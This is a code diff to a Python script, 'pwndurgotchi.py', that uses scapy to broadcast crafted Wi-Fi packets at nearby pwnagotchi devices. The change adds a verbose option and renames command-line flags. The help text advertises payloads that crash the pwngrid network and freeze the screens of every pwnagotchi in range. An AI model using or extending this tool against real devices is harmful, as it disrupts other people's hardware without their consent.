@@ -82,16 +82,21 @@ def send_payload(
     iface="wlan0",
     sleep_time=0,
     loop_count=0,
+    verbose=False,
 ):
     if loop_count > 0:
         for i in range(0, loop_count):
             packet = create_pwn_packet(payload_file_path, use_random_identity)
-            sendp(packet, loop=0, count=play_count, iface=iface, verbose=True)
+            if verbose == True:
+                packet.show()
+            sendp(packet, loop=0, count=play_count, iface=iface, verbose=verbose)
             if sleep_time > 0:
                 sleep(sleep_time)
     else:
         packet = create_pwn_packet(payload_file_path, use_random_identity)
-        sendp(packet, loop=0, count=play_count, iface=iface, verbose=True)
+        if verbose == True:
+            packet.show()
+        sendp(packet, loop=0, count=play_count, iface=iface, verbose=verbose)
 
 
 def help():
@@ -100,24 +105,25 @@ def help():
     print(
         "Usage: python pwndurgotchi.py [-p | --payload <path>] [-i | --interface <name>] [-c | --count <value>]"
     )
-    print("[-r | random_identity <value>] [-s | --sleep <value>] [-l | --loop <value>]")
+    print(
+        "[-s | static_identity] [-d | --delay <value>] [-l | --loop <value>] [-v | --verbose]"
+    )
     print("")
     print("-p --payload\t\tPath to the JSON payload to send")
     print(
         "-i --interface\t\tWireless interface used to send the packets (default wlan0)"
     )
     print("-c --count\t\tNumber of packets to send at a time (default 1)")
-    print("-r --random_identity\tTrue/False to use a random identity (default True)")
-    print("-s --sleep\t\tTime to sleep in between each loop (default 0)")
+    print("-s --static_identity\tUse the static identity in each payload")
+    print("-d --delay\t\tDelay time in between each loop (default 0)")
     print("-l --loop\t\tAmount of times to loop (default 0)")
+    print("-v --verbose\t\tPrint logs during execution")
     print("")
     print("Requires a wireless interface in monitor mode and scapy")
     print("")
     print("Payloads:")
     print("calling_card.json\tSends a custom face & username to all nearby pwnagotchi")
-    print(
-        "kill_grid.json\t\tCrashes the pwngrid network on all nearby pwnagotchi. **Requires -r False to work**"
-    )
+    print("kill_grid.json\t\tCrashes the pwngrid network on all nearby pwnagotchi")
     print("screen_freeze.json\tFreeze the screen of all nearby pwnagotchi")
     print("")
     print("Made by BigBroDude6119")
@@ -132,6 +138,7 @@ def main():
     random_identity = True
     sleep_time = 0
     loop_count = 0
+    verbose = False
 
     if not len(sys.argv[1:]):
         help()
@@ -139,15 +146,16 @@ def main():
     try:
         opts, _ = getopt.getopt(
             sys.argv[1:],
-            "hp:i:c:r:s:l:",
+            "hp:i:c:sd:l:v",
             [
                 "help",
                 "payload",
                 "interface",
                 "count",
-                "random_identity",
-                "sleep",
+                "static_identity",
+                "delay",
                 "loop",
+                "verbose",
             ],
         )
     except getopt.GetoptError as err:
@@ -163,16 +171,24 @@ def main():
             iface = arg
         elif opt in ("-c", "--count"):
             count = int(arg)
-        elif opt in ("-r", "--random_identity"):
-            random_identity = arg == "True"
-        elif opt in ("-s", "--sleep"):
+        elif opt in ("-s", "--static_identity"):
+            random_identity = False
+        elif opt in ("-d", "--delay"):
             sleep_time = int(arg)
         elif opt in ("-l", "--loop"):
             loop_count = int(arg)
+        elif opt in ("-v", "--verbose"):
+            verbose = True
 
     if payload_file_path:
         send_payload(
-            payload_file_path, random_identity, count, iface, sleep_time, loop_count
+            payload_file_path,
+            random_identity,
+            count,
+            iface,
+            sleep_time,
+            loop_count,
+            verbose,
         )
     else:
         print("Payload path is required")
